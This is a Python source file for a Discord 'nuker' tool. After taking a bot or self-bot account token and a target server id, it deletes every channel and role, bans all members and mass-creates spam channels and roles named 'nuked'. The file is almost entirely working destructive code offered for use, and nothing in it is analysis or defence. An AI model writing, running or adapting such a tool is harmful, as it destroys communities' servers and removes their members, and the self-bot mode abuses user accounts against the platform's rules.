import discord  
from discord.ext import commands
from modules.helper import *
from getpass import getpass

# intents = discord.Intents().all()

# client = commands.Bot(command_prefix='.', intents=intents)

class nuker:
    class auth:
        self_bot = False
        bot = True
        def switch_sb():
            nuker.auth.bot = not nuker.auth.bot
            nuker.auth.self_bot = not nuker.auth.self_bot
        token = ""
    
    guild_id = 989429570954481695
    def modify_gi():
        guild_id = input("[>] Guild id: ")
        if guild_id == "":
            error("Guild id cannot be empty.", payload)
        elif not guild_id.isnumeric():
            error("Guild id is not a number.", payload)
        else:
            nuker.guild_id = int(guild_id)

    del_all_channels = True
    def switch_dac(): 
        nuker.del_all_channels = not nuker.del_all_channels

    del_all_roles = True
    def switch_dar(): 
        nuker.del_all_roles = not nuker.del_all_roles

    ban_all_members = True
    def switch_bam(): 
        nuker.ban_all_members = not nuker.ban_all_members

    create_channels = False
    def switch_cc(): 
        nuker.create_channels = not nuker.create_channels
        
    channel_name = "nuked"
    def modify_cn():
        if not nuker.create_channels:
            error("This option is disabled. Please enable create channels to enable this option",  payload)
        channel_name = str(input("[>] Channel name: ")).replace(" ", "-")
        if channel_name == "":
            error("Channel name cannot be empty", payload)
        else:
            nuker.channel_name = channel_name

    channel_type = 1 # 1: text 2: voice
    def modify_ct():
        if not nuker.create_channels:
            error("This option is disabled. Please enable create channels to enable this option",  payload)
        print("[i] 1: Text channel")
        print("[i] 2: Voice channel\n")
        channel_type = input("[>] Channel type: ")
        if channel_type.isnumeric():
            nuker.channel_type = int(channel_type)
        else:
            error("Channel type is not a number", payload)

    channel_amount = 1
    def modify_ca():
        if not nuker.create_channels:
            error("This option is disabled. Please enable create channels to enable this option",  payload)
        channel_amount = input("[>] Channel amount: ")
        if not channel_amount.isnumeric():
            error("Channel amount is not a number", payload)
        elif int(channel_amount) <= 0:
            error("Channel amount cannot be 0 or less", payload)
        else:
            nuker.channel_amount = int(channel_amount)

    create_roles = False
    def switch_cr():
        nuker.create_roles = not nuker.create_roles

    role_name = "nuked"
    def modify_rn():
        if not nuker.create_roles:
            error("This option is disabled. Please enable create roles to enable this option",  payload)
        role_name = str(input("[>] Role name: "))
        if role_name == "":
            nuker.role_name = "new role"
        else:
            nuker.role_name = str(role_name)

    role_amount = 1
    def modify_ra():
        if not nuker.create_roles:
            error("This option is disabled. Please enable create roles to enable this option",  payload)
        role_amount = input("[>] Role amount: ")
        if not role_amount.isnumeric():
            error("Role amount is not a number", payload)
        elif int(role_amount) <= 0:
            error("Role amount cannot be 0 or less", payload)
        else:
            nuker.role_amount = int(role_amount)

    
def main():
    banner.discord.nuker()
    selfbot = input("\n[>] Self bot? (y/N) ")
    if selfbot.lower() == "n" or selfbot == "":
        nuker.auth.self_bot = False
    elif selfbot.lower() == "y":
        nuker.auth.self_bot = True
        nuker.auth.bot = False
    else:
        error("Invalid option", main)
    # token = getpass("[>] Token: ")
    token = input("[>] Token: ")
    nuker.auth.token = token
    cls()
    payload()

def payload():
    opts = {
        "1": nuker.modify_gi,
        "2": nuker.switch_dac,
        "3": nuker.switch_dar,
        "4": nuker.switch_bam,
        "5": nuker.switch_cc,
        "5.1": nuker.modify_cn,
        "5.2": nuker.modify_ct,
        "5.3": nuker.modify_ca,
        "6": nuker.switch_cr,
        "6.1": nuker.modify_rn,
        "6.2": nuker.modify_ra,
        "99": connect
    }

    banner.discord.nuker()
    print(" " * 15 + terminal.color + "1. Target guild id       : " + terminal.value + str(nuker.guild_id))
    print(" " * 15 + terminal.color + "2. Delete all channels   : " + terminal.value + str(nuker.del_all_channels).replace("True", terminal.true + "True").replace("False", terminal.false + "False"))
    print(" " * 15 + terminal.color + "3. Delete all roles      : " + terminal.value + str(nuker.del_all_roles).replace("True", terminal.true + "True").replace("False", terminal.false + "False"))
    print(" " * 15 + terminal.color + "4. Ban all members       : " + terminal.value + str(nuker.ban_all_members).replace("True", terminal.true + "True").replace("False", terminal.false + "False"))
    print(" " * 15 + terminal.color + "5. Create channels       : " + terminal.value + str(nuker.create_channels).replace("True", terminal.true + "True").replace("False", terminal.false + "False"))
    if nuker.create_channels:
       print(" " * 18 + terminal.color + "5.1. Name             : " + terminal.value + str(nuker.channel_name))
       print(" " * 18 + terminal.color + "5.2. Type             : " + terminal.value + str(nuker.channel_type).replace("1", "Text channel").replace("2", "Voice channel"))
       print(" " * 18 + terminal.color + "5.3. Amount           : " + terminal.value + str(nuker.channel_amount))
    print(" " * 15 + terminal.color + "6. Create roles          : " + terminal.value + str(nuker.create_roles).replace("True", terminal.true + "True").replace("False", terminal.false + "False"))
    if nuker.create_roles:
       print(" " * 18 + terminal.color + "6.1. Name             : " + terminal.value + str(nuker.role_name))
       print(" " * 18 + terminal.color + "6.2. Amount           : " + terminal.value + str(nuker.role_amount))
       print(" " * 15 + terminal.color + "99. Next")
    print(" " * 15 + terminal.color + "100. Return\n")
    option = input("[>] Option: ")
    if option == "100": return
    call = opts.get(str(option), invalid)
    call()
    cls()
    payload()

def connect():
    cls()
    print(f"self_bot = {nuker.auth.self_bot} bot = {nuker.auth.bot}")
    banner.discord.nuker()
    print("[i] Connecting...", end="\r")
    intents = discord.Intents().all()

    client = discord.Client(intents=intents, self_bot=nuker.auth.self_bot)

    @client.event
    async def on_ready():
        print("[i] Logged in as " + terminal.value + f"{client.user.name}#{client.user.discriminator}")
        print("[i] Looking for guild...", end="\r")
        for guild in client.guilds:
            if guild.id == nuker.guild_id:
                target = guild
                print(terminal.true + "[i] Guild found: " + terminal.value + target.name  + "       " + terminal.color)

                confirm = input("[>] Are you sure the guild above is the correct guild? (Y/n) ")
                if confirm.lower() == "n":
                    cls()
                    payload()


                if nuker.del_all_channels:
                    for channel in target.channels:
                        try:
                            await channel.delete(reason=None)
                            print(terminal.true + f"[+] [CHANNEL] Successfully deleted: {channel.name}")
                        except:
                            print(terminal.false + f"[-] [CHANNEL] Failed to delete: {channel.name}")
                
                if nuker.del_all_roles:
                    for role in target.roles:
                        try:
                            await role.delete()
                            print(terminal.true + f"[+] [ROLE] Successfully deleted: {role.name}")
                        except:
                            print(terminal.false + f"[-] [ROLE] Failed to delete: {role.name}")
                
                if nuker.ban_all_members:
                    for member in target.members:
                        try:
                            await member.ban()
                            print(terminal.true + f"[+] [MEMBER] Successfully banned {member.name}#{member.discriminator}")
                        except:
                            print(terminal.false + f"[-] [MEMBER] Failed to ban {member.name}#{member.discriminator}")
                
                if nuker.create_channels:
                    if nuker.channel_type == 1:
                        for i in range(nuker.channel_amount):
                            await target.create_text_channel(name=nuker.channel_name)
                            print(terminal.true + f"[+] [CHANNEL] [{i+1}] Created channel: {nuker.channel_name}")
                    elif nuker.channel_type == 2:
                        for i in range(nuker.channel_amount):
                            await target.create_voice_channel(name=nuker.channel_name)
                            print(terminal.true + f"[+] [CHANNEL] [{i+1}] Created channel: {nuker.channel_name}")
                
                if nuker.create_roles:
                    for i in range(nuker.role_amount):
                        await target.create_role(name=nuker.role_name)
                        print(terminal.true + f"[+] [CHANNEL] [{i+1 }] Created role: {nuker.channel_name}")
                    
                await client.close()
                input("[>] Press ENTER to continue")
                cls()
                main()

        if not 'target' in locals():
            print(terminal.false + "[i] Guild not found     " + terminal.color)
            await client.close()
            input("[>] Press ENTER to continue")
            cls()
            main()
    # try:
    
    # except:
    # if nuker.del_all_channels:    

    client.run(nuker.auth.token, bot=nuker.auth.bot)

def invalid():
    error("Invalid option", payload)




# client.command_prefix =  ''